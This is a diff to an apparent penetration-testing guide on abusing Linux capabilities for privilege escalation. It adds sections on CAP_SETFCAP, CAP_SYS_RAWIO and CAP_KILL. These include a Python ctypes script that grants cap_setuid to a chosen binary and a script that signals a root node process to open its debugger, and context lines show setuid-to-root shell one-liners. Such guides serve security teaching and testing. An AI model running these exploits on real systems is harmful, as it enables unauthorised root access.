@@ -689,7 +689,7 @@ su - root
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us make arbitrary changes to file UIDs and GIDs.
+[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary changes to file UIDs and GIDs.
 
 **This means that it's possible to change the ownership of any file.**
 {% endtab %}
@@ -973,7 +973,7 @@ $ php -r "posix_setuid(0); system('/bin/bash');"
 
 {% tabs %}
 {% tab title="Desc" %}
-[**CAP\_SETGID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to Make arbitrary manipulations of process GIDs and supplementary GID list.
+[**CAP\_SETGID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary manipulations of process GIDs and supplementary GID list.
 
 **This means that it's possible to set the effective group id of the created process.**
 {% endtab %}
@@ -1121,9 +1121,104 @@ $ php -r "posix_setgid(42); system('/bin/bash');"
 
 #### CAP\_SETFCAP
 
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_SETFCAP**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to set arbitrary capabilities on a file.
+
+**This means that it's possible to set capabilities on files and processes**
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_setfcap+ep
+```
+
+We can abuse it to add the cap\_setuid capability to the binary of our choice. To exploit, we can use the following script&#x20;
+
+{% code title="setcapability.py" %}
+```python
+import ctypes, sys
+
+#Load needed library
+#You can find which library you need to load checking the libraries of local setcap binary
+# ldd /sbin/setcap
+libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
+
+libcap.cap_from_text.argtypes = [ctypes.c_char_p]
+libcap.cap_from_text.restype = ctypes.c_void_p
+libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]
+
+#Give setuid cap to the binary
+cap = 'cap_setuid+ep'
+path = sys.argv[1]
+print(path)
+cap_t = libcap.cap_from_text(cap)
+status = libcap.cap_set_file(path,cap_t)
+
+if(status == 0):
+    print (cap + " was successfully added to " + path)
+```
+{% endcode %}
+
+Execute it on the file of your choice
+
+```bash
+$ python3.11 setcapability.py '/usr/bin/ruby' 
+```
+
+{% hint style="danger" %}
+Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
+{% endhint %}
+
+Once you have [SETUID capability](capabilities.md#cap\_setuid) you can go to its section to see how to escalate privileges.
+{% endtab %}
+{% endtabs %}
+
 #### CAP\_SYS\_RAWIO
 
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_SYS\_RAWIO** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.
+
+This can be useful for **privilege escalation** and **Docker breakout.**
+{% endtab %}
+{% endtabs %}
+
 #### CAP\_KILL
+
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_KILL** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to bypass permission checks for sending signals (see [kill(2)](https://man7.org/linux/man-pages/man2/kill.2.html)). This includes use of the[ ioctl(2)](https://man7.org/linux/man-pages/man2/ioctl.2.html) KDSIGACCEPT operation.
+
+**This means that it's possible to kill any process.**
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_kill+ep
+```
+
+If there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.
+
+```bash
+$ cat exploit.py
+#Use this python code to kill arbitrary processes
+import os
+import signal
+pgid = os.getpgid(341) #this is the node.js pid
+os.killpg(pgid, signal.SIGUSR1) 
+
+# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
+$ python exploit.py
+```
+{% endtab %}
+{% endtabs %}
 
 #### CAP\_NET\_BIND\_SERVICE
 
